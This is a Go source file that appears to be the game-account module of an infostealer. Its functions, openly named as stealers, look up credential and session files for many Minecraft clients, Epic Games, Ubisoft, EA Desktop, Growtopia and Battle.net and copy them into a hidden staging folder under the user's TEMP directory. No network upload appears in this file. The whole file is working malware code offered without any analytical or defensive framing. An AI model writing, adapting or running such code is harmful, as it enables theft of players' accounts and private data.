package Games

import (
	"fmt"
	"io"
	"io/ioutil"
	"strings"
	"os"
	"path/filepath"
)

func Run() {
	games2save := filepath.Join(os.Getenv("TEMP"), strings.ToLower(os.Getenv("USERNAME")), "games")
	err := os.MkdirAll(games2save, 0755)
	if err != nil {
		fmt.Printf("Error creating directory: %v\n", err)
		return
	}

	minecraftstealer(games2save)
	epicgames_stealer(games2save)
	ubisoftstealer(games2save)
	electronic_arts(games2save)
	growtopiastealer(games2save)
	battle_net_stealer(games2save)
}

func minecraftstealer(games2save string) {
	minecraftPaths := map[string]string{
		"Intent":          filepath.Join(os.Getenv("USERPROFILE"), "intentlauncher", "launcherconfig"),
		"Lunar":           filepath.Join(os.Getenv("USERPROFILE"), ".lunarclient", "settings", "game", "accounts.json"),
		"TLauncher":       filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "TlauncherProfiles.json"),
		"Feather":         filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".feather", "accounts.json"),
		"Meteor":          filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "meteor-client", "accounts.nbt"),
		"Impact":          filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Impact", "alts.json"),
		"Novoline":        filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Novoline", "alts.novo"),
		"CheatBreakers":   filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
		"Microsoft Store": filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
		"Rise":            filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
		"Rise (Intent)":   filepath.Join(os.Getenv("USERPROFILE"), "intentlauncher", "Rise", "alts.txt"),
		"Paladium":        filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "paladium-group", "accounts.json"),
		"PolyMC":          filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "PolyMC", "accounts.json"),
		"Badlion":         filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Badlion Client", "accounts.json"),
	}

	for _, path := range minecraftPaths {
		if _, err := os.Stat(path); err == nil {
			copyFile(path, filepath.Join(games2save, "Minecraft", filepath.Base(path)))
		} 
	}
}

func epicgames_stealer(games2save string) {
	epicgamesfolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "EpicGamesLauncher")
	if _, err := os.Stat(epicgamesfolder); os.IsNotExist(err) {
		return
	}

	copyDir(filepath.Join(epicgamesfolder, "Saved", "Config"), filepath.Join(games2save, "EpicGames", "Config"))
	copyDir(filepath.Join(epicgamesfolder, "Saved", "Logs"), filepath.Join(games2save, "EpicGames", "Logs"))
	copyDir(filepath.Join(epicgamesfolder, "Saved", "Data"), filepath.Join(games2save, "EpicGames", "Data"))
}

func ubisoftstealer(games2save string) {
	ubisoftfolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
	if _, err := os.Stat(ubisoftfolder); os.IsNotExist(err) {
		return
	}

	copyDir(ubisoftfolder, filepath.Join(games2save, "Ubisoft"))
}

func electronic_arts(games2save string) {
	eafolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "Electronic Arts", "EA Desktop", "CEF")
	if _, err := os.Stat(eafolder); os.IsNotExist(err) {
		return
	}

	parentDirName := filepath.Base(filepath.Dir(eafolder))
	destination := filepath.Join(games2save, "Electronic Arts", parentDirName)
	copyDir(eafolder, destination)
}

func growtopiastealer(games2save string) {
	growtopiafolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "Growtopia")
	if _, err := os.Stat(growtopiafolder); os.IsNotExist(err) {
		return
	}

	saveFile := filepath.Join(growtopiafolder, "save.dat")
	if _, err := os.Stat(saveFile); os.IsNotExist(err) {
		fmt.Printf("Save file %s not found\n", saveFile)
		return
	}

	copyFile(saveFile, filepath.Join(games2save, "Growtopia", "save.dat"))
}

func battle_net_stealer(games2save string) {
	battle_folder := filepath.Join(os.Getenv("APPDATA"), "Battle.net")
	if _, err := os.Stat(battle_folder); os.IsNotExist(err) {
		return
	}

	files, err := ioutil.ReadDir(battle_folder)
	if err != nil {
		fmt.Printf("Error reading directory: %v\n", err)
		return
	}

	for _, file := range files {
		if !file.IsDir() && (filepath.Ext(file.Name()) == ".db" || filepath.Ext(file.Name()) == ".config") {
			copyFile(filepath.Join(battle_folder, file.Name()), filepath.Join(games2save, "Battle.net", file.Name()))
		}
	}
}

func copyFile(src, dst string) {
	// Create the directory for the destination file if it doesn't exist
	err := os.MkdirAll(filepath.Dir(dst), 0755)
	if err != nil {
		fmt.Printf("Error creating destination directory for file %s: %v\n", dst, err)
		return
	}

	sourceFile, err := os.Open(src)
	if err != nil {
		fmt.Printf("Error opening source file %s: %v\n", src, err)
		return
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		fmt.Printf("Error creating destination file %s: %v\n", dst, err)
		return
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		fmt.Printf("Error copying file contents from %s to %s: %v\n", src, dst, err)
		return
	}
}

func copyDir(src, dst string) {
	// Create destination directory if it doesn't exist
	err := os.MkdirAll(dst, 0755)
	if err != nil {
		fmt.Printf("Error creating destination directory %s: %v\n", dst, err)
		return
	}

	// Copy each file/directory within the source directory
	files, err := ioutil.ReadDir(src)
	if err != nil {
		fmt.Printf("Error reading directory %s: %v\n", src, err)
		return
	}

	for _, file := range files {
		sourcePath := filepath.Join(src, file.Name())
		destinationPath := filepath.Join(dst, file.Name())

		if file.IsDir() {
			copyDir(sourcePath, destinationPath)
		} else {
			copyFile(sourcePath, destinationPath)
		}
	}
}
